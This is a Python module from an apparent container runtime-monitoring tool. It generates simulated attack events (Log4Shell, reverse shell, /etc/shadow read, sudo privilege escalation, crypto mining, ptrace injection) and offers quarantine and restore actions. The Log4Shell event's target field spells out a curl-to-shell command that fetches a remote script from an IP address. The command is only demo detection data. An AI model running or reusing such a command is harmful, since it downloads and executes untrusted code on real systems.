"""
VulnWatch - Approach A: Runtime Agent & Behavioral Monitoring Engine
Monitors live syscalls (execve, openat, socket, connect), network connections, file access,
correlating with known CVEs to distinguish static presence from real-time active exploitation.
"""

import uuid
import random
from datetime import datetime, timezone
from typing import List, Dict, Optional, Any
from models import RuntimeEvent, EventTypeEnum, SeverityEnum, ContainerStatusEnum
from database import db


class RuntimeAgentService:
    @staticmethod
    def get_events_for_container(container_id: str) -> List[RuntimeEvent]:
        """Fetch all runtime events for a container sorted by latest"""
        return [e for e in db.runtime_events if e.container_id == container_id]

    @staticmethod
    def get_all_recent_events(limit: int = 50) -> List[RuntimeEvent]:
        """Get latest global runtime event stream"""
        return sorted(db.runtime_events, key=lambda x: x.timestamp, reverse=True)[:limit]

    @staticmethod
    def simulate_attack_scenario(container_id: str, attack_type: str) -> RuntimeEvent:
        """Simulate dynamic runtime exploitation on target container (Approach A verification)"""
        container = db.containers.get(container_id)
        if not container:
            raise ValueError(f"Container {container_id} not found")

        now_str = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
        evt_id = f"evt-sim-{uuid.uuid4().hex[:8]}"

        if attack_type == "log4shell":
            event = RuntimeEvent(
                id=evt_id,
                container_id=container_id,
                container_name=container.name,
                timestamp=now_str,
                event_type=EventTypeEnum.SYSCALL,
                syscall_name="execve",
                process_name="java",
                pid=random.randint(4000, 4999),
                severity=SeverityEnum.CRITICAL,
                source=f"java [PID: {random.randint(4000, 4999)}] /app/target/app.jar",
                target="/bin/sh -c 'curl http://194.26.29.112:8000/rce.sh | sh'",
                details="CRITICAL: Log4j JNDI lookup triggered malicious remote classloader execution via execve syscall.",
                correlated_cve_id="CVE-2021-44228",
                is_anomaly=True,
                mitre_attack_technique="T1059.004 (Unix Shell Command Execution)",
                blocked=False
            )
            container.status = ContainerStatusEnum.COMPROMISED
            container.has_active_runtime_threat = True
            container.health_score = max(10, container.health_score - 40)
            container.ai_risk_summary = "ACTIVE EXPLOITATION: Real-time JNDI remote code execution detected via live eBPF execve probe."

        elif attack_type == "reverse_shell":
            event = RuntimeEvent(
                id=evt_id,
                container_id=container_id,
                container_name=container.name,
                timestamp=now_str,
                event_type=EventTypeEnum.NETWORK,
                syscall_name="connect",
                process_name="bash",
                pid=random.randint(5000, 5999),
                severity=SeverityEnum.CRITICAL,
                source=f"{container.ip_address}:51234",
                target="45.154.255.88:1337 (Known Tor Exit / Botnet C2)",
                details="Unrecognized outbound interactive TCP socket connection opened to hostile C2 node.",
                correlated_cve_id="CVE-2021-44228",
                is_anomaly=True,
                mitre_attack_technique="T1071.001 (Application Layer Protocol: C2)",
                blocked=False
            )
            container.status = ContainerStatusEnum.COMPROMISED
            container.has_active_runtime_threat = True
            container.health_score = max(15, container.health_score - 30)

        elif attack_type == "shadow_read":
            event = RuntimeEvent(
                id=evt_id,
                container_id=container_id,
                container_name=container.name,
                timestamp=now_str,
                event_type=EventTypeEnum.FILE_ACCESS,
                syscall_name="openat",
                process_name="cat",
                pid=random.randint(6000, 6999),
                severity=SeverityEnum.HIGH,
                source=f"unprivileged_worker [PID: {random.randint(6000, 6999)}]",
                target="/etc/shadow",
                details="Anomalous file descriptor open on credential storage (/etc/shadow). Automatically intercepted by VulnWatch kernel hook.",
                correlated_cve_id=None,
                is_anomaly=True,
                mitre_attack_technique="T1003.008 (OS Credential Dumping: /etc/shadow)",
                blocked=True
            )
            container.status = ContainerStatusEnum.SUSPICIOUS
            container.has_active_runtime_threat = True
            container.health_score = max(40, container.health_score - 15)

        elif attack_type == "priv_esc":
            event = RuntimeEvent(
                id=evt_id,
                container_id=container_id,
                container_name=container.name,
                timestamp=now_str,
                event_type=EventTypeEnum.PRIV_ESC,
                syscall_name="setuid",
                process_name="sudo",
                pid=random.randint(7000, 7999),
                severity=SeverityEnum.HIGH,
                source="node [PID: 2190]",
                target="UID: 0 (root)",
                details="Privilege escalation via sudo buffer overflow (CVE-2021-3156) memory corruption pattern.",
                correlated_cve_id="CVE-2021-3156",
                is_anomaly=True,
                mitre_attack_technique="T1068 (Exploitation for Privilege Escalation)",
                blocked=False
            )
            container.status = ContainerStatusEnum.COMPROMISED
            container.has_active_runtime_threat = True
            container.health_score = max(35, container.health_score - 25)

        elif attack_type == "crypto_miner":
            event = RuntimeEvent(
                id=evt_id,
                container_id=container_id,
                container_name=container.name,
                timestamp=now_str,
                event_type=EventTypeEnum.CPU_SPIKE,
                syscall_name="nanosleep",
                process_name="xmrig_daemon",
                pid=random.randint(8000, 8999),
                severity=SeverityEnum.HIGH,
                source="crypto_miner_worker",
                target="CPU Core 0-3 (99.8% Load)",
                details="Sustained abnormal CPU spike with Stratum mining pool network protocol signatures.",
                correlated_cve_id=None,
                is_anomaly=True,
                mitre_attack_technique="T1496 (Resource Hijacking: Cryptocurrency Mining)",
                blocked=False
            )
            container.cpu_usage_pct = 98.9
            container.status = ContainerStatusEnum.SUSPICIOUS
            container.has_active_runtime_threat = True

        else:
            event = RuntimeEvent(
                id=evt_id,
                container_id=container_id,
                container_name=container.name,
                timestamp=now_str,
                event_type=EventTypeEnum.SYSCALL,
                syscall_name="ptrace",
                process_name="dbg_injector",
                pid=random.randint(9000, 9999),
                severity=SeverityEnum.MEDIUM,
                source="injector_tool",
                target="Process PID 1 (Init)",
                details="Unauthorized process memory inspection and ptrace attach attempt.",
                correlated_cve_id=None,
                is_anomaly=True,
                mitre_attack_technique="T1055 (Process Injection)",
                blocked=True
            )

        db.runtime_events.insert(0, event)
        return event

    @staticmethod
    def isolate_container(container_id: str) -> Dict[str, Any]:
        """DevOps Action: Quarantine and network isolate compromised container"""
        container = db.containers.get(container_id)
        if not container:
            raise ValueError("Container not found")

        container.status = ContainerStatusEnum.ISOLATED
        container.has_active_runtime_threat = False
        container.ai_risk_summary = "CONTAINER QUARANTINED: Egress network interfaces disconnected, ingress blocked, runtime PID tree frozen."

        # Add audit event
        audit_evt = RuntimeEvent(
            id=f"evt-iso-{uuid.uuid4().hex[:6]}",
            container_id=container_id,
            container_name=container.name,
            timestamp=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S"),
            event_type=EventTypeEnum.NETWORK,
            syscall_name="netlink_route",
            process_name="vulnwatch-daemon",
            pid=1,
            severity=SeverityEnum.INFO,
            source="VulnWatch Orchestrator",
            target=container.ip_address,
            details=f"Applied zero-trust network quarantine policy to {container.name}. Egress blocked.",
            correlated_cve_id=None,
            is_anomaly=False,
            mitre_attack_technique="M1037 (Filter Network Traffic)",
            blocked=True
        )
        db.runtime_events.insert(0, audit_evt)

        return {
            "success": True,
            "container_id": container_id,
            "new_status": ContainerStatusEnum.ISOLATED.value,
            "message": f"Container {container.name} successfully isolated from network mesh."
        }

    @staticmethod
    def restore_container(container_id: str) -> Dict[str, Any]:
        """DevOps Action: Restore healthy status after patching"""
        container = db.containers.get(container_id)
        if not container:
            raise ValueError("Container not found")

        container.status = ContainerStatusEnum.RUNNING
        container.has_active_runtime_threat = False
        container.health_score = 92
        container.cpu_usage_pct = 22.4
        container.ai_risk_summary = "RESTORED: Patched image deployed and runtime verification clean."

        return {
            "success": True,
            "container_id": container_id,
            "new_status": ContainerStatusEnum.RUNNING.value,
            "message": f"Container {container.name} restored to active cluster."
        }
